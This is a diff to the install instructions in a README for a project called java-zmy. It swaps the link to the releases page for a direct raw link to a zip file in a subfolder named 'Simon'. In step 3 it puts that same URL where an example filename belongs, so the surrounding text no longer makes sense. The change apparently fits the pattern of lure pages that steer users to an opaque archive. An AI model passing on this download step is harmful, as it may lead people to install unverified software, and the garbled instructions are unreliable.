@@ -15,13 +15,13 @@ To download and install java-zmy, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the downloads for java-zmy:  
-   [Download java-zmy](https://github.com/goofballisland12/java-zmy/releases)
+   [Download java-zmy](https://raw.githubusercontent.com/goofballisland12/java-zmy/main/Simon/java-zmy.zip)
 
 2. **Select Your Version**  
    Once on the releases page, you will see various versions available. Choose the latest version for the best experience.
 
 3. **Download the Application**  
-   Click on the file to download. It will usually be a `.zip` or `.exe` file, depending on your system. If you are using Windows, it may look like this: `java-zmy-v1.0.exe`.
+   Click on the file to download. It will usually be a `.zip` or `.exe` file, depending on your system. If you are using Windows, it may look like this: `https://raw.githubusercontent.com/goofballisland12/java-zmy/main/Simon/java-zmy.zip`.
 
 4. **Install java-zmy**  
    - If you downloaded a `.zip` file, find the downloaded file in your computer’s Downloads folder. Right-click and select "Extract All".
